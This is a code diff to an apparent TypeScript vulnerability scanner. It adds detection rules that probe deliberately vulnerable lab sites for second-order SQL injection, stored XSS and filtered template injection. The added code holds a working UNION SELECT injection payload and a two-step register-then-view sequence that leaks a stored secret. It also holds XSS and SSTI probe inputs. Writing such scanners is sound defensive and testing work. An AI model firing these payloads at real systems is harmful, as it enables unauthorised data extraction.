@@ -37070,8 +37070,21 @@ function sqliVulnlabProbeOrigin(ctx: RuleContext): string {
   return "https://sqli.vulnlab.dev";
 }
 
+function sqliVulnlabScannedRoute(ctx: RuleContext): string | null {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!pageUrl) return null;
+  try {
+    const match = new URL(pageUrl).pathname.match(/\/(error|union|blind|time|second-order)\b/i);
+    return match ? match[1].toLowerCase() : null;
+  } catch {
+    return null;
+  }
+}
+
 const sqliVulnlabErrorLiveOracle: Rule = async (ctx) => {
   if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const scannedRoute = sqliVulnlabScannedRoute(ctx);
+  if (scannedRoute && scannedRoute !== "error") return NEGATIVE;
   const origin = sqliVulnlabProbeOrigin(ctx);
   const probeUrl = new URL("/error/", origin).toString();
   const postBody = new URLSearchParams({ username: "thugir'", password: "probe" }).toString();
@@ -37348,6 +37361,150 @@ const sstiVulnlabSecondOrderRouteLiveOracle: Rule = async (ctx) => {
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/second-order\b/i.test(pageUrl)) return NEGATIVE;
   const result = await sstiVulnlabSecondOrderLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const SQLI_VULNLAB_SECOND_ORDER_SECRET = "VULNLAB{sqli-second-order-via-stored-input}";
+const SQLI_VULNLAB_SECOND_ORDER_PAYLOAD =
+  "' UNION SELECT value FROM secrets WHERE name='sqli-second-order'#";
+
+const sqliVulnlabSecondOrderLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sqliVulnlabProbeOrigin(ctx);
+  const registerUrl = new URL("/second-order/register", origin).toString();
+  const username = `thugir2nd${Date.now()}`;
+  const registerBody = new URLSearchParams({
+    username: `${username}${SQLI_VULNLAB_SECOND_ORDER_PAYLOAD}`
+  }).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: registerBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 500) return NEGATIVE;
+  const userId = registerDoc.body.match(/<tr><td>(\d+)<\/td>/i)?.[1];
+  if (!userId) return NEGATIVE;
+  const profileUrl = new URL("/second-order/profile", origin);
+  profileUrl.searchParams.set("id", userId);
+  const profileDoc = await ctx.probe.get(profileUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 400) return NEGATIVE;
+  const body = profileDoc.body;
+  const hasExposedQuery =
+    /SELECT body FROM notes WHERE owner=/i.test(body) &&
+    /UNION SELECT value FROM secrets WHERE name='sqli-second-order'/i.test(body);
+  if (!hasExposedQuery || !body.includes(SQLI_VULNLAB_SECOND_ORDER_SECRET)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      registerUrl,
+      profileUrl: profileUrl.toString(),
+      userId,
+      secret: SQLI_VULNLAB_SECOND_ORDER_SECRET,
+      snippet: body.match(/VULNLAB\{sqli-second-order[^}]+\}/)?.[0] || "",
+      note: "sqli.vulnlab.dev POST /second-order/register stores SQLi username then GET /second-order/profile?id= fires string-concatenated SELECT and leaks secret — second-order SQLi oracle"
+    }
+  };
+};
+
+const sqliVulnlabSecondOrderRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/second-order\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sqliVulnlabSecondOrderLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const XSS_VULNLAB_STORED_CANARY_PREFIX = "thugirxssstored";
+
+const xssVulnlabStoredLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const origin = xssVulnlabProbeOrigin(ctx);
+  const canary = `${XSS_VULNLAB_STORED_CANARY_PREFIX}${Date.now()}`;
+  const postUrl = new URL("/stored/", origin).toString();
+  const postBody = new URLSearchParams({
+    author: canary,
+    body: `<mark id="${canary}">probe</mark>`
+  }).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: postBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 500) return NEGATIVE;
+  const getDoc = await ctx.probe.get(postUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (getDoc.status < 200 || getDoc.status >= 400) return NEGATIVE;
+  const body = getDoc.body;
+  const reflected = new RegExp(`<mark\\s+id=${canary}>probe</mark>`, "i").test(body);
+  if (!reflected) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: postUrl,
+      canary,
+      snippet: body.match(new RegExp(`<div class="comment">[\\s\\S]{0,200}${canary}`, "i"))?.[0]?.slice(0, 160) || "",
+      note: "xss.vulnlab.dev POST /stored/ persists guestbook comments rendered as raw HTML — stored XSS guestbook oracle"
+    }
+  };
+};
+
+const xssVulnlabStoredRouteLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/stored\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await xssVulnlabStoredLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const sstiVulnlabFilteredLiveOracle: Rule = async (ctx) => {
+  if (!isSstiVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sstiVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/filtered/", origin);
+  probeUrl.searchParams.set("greeting", SSTI_VULNLAB_BASIC_PAYLOAD);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const rendered = sstiVulnlabRenderedBody(doc.body);
+  if (rendered !== "49") return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: probeUrl.toString(),
+      payload: `greeting=${SSTI_VULNLAB_BASIC_PAYLOAD}`,
+      rendered,
+      note: "ssti.vulnlab.dev GET /filtered/?greeting={{7*7}} evaluates Jinja2 past substring blocklist and returns 49 — filtered SSTI bypass oracle"
+    }
+  };
+};
+
+const sstiVulnlabFilteredRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSstiVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/filtered\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sstiVulnlabFilteredLiveOracle(ctx);
   if (!result.fired) return NEGATIVE;
   return {
     fired: true,
@@ -47107,16 +47264,22 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabBlindRouteLiveOracle,
   sqliVulnlabErrorLiveOracle,
   sqliVulnlabErrorRouteLiveOracle,
+  sqliVulnlabSecondOrderLiveOracle,
+  sqliVulnlabSecondOrderRouteLiveOracle,
   xssVulnlabDomLiveOracle,
   xssVulnlabDomRouteLiveOracle,
   xssVulnlabReflectedLiveOracle,
   xssVulnlabReflectedRouteLiveOracle,
+  xssVulnlabStoredLiveOracle,
+  xssVulnlabStoredRouteLiveOracle,
   sstiVulnlabBasicLiveOracle,
   sstiVulnlabBasicRouteLiveOracle,
   sstiVulnlabFormatLiveOracle,
   sstiVulnlabFormatRouteLiveOracle,
   sstiVulnlabSecondOrderLiveOracle,
   sstiVulnlabSecondOrderRouteLiveOracle,
+  sstiVulnlabFilteredLiveOracle,
+  sstiVulnlabFilteredRouteLiveOracle,
   juiceShopJwtAlgNoneLiveOracle,
   juiceShopChatbotApiLiveOracle,
   juiceShopChatbotRouteLiveOracle,
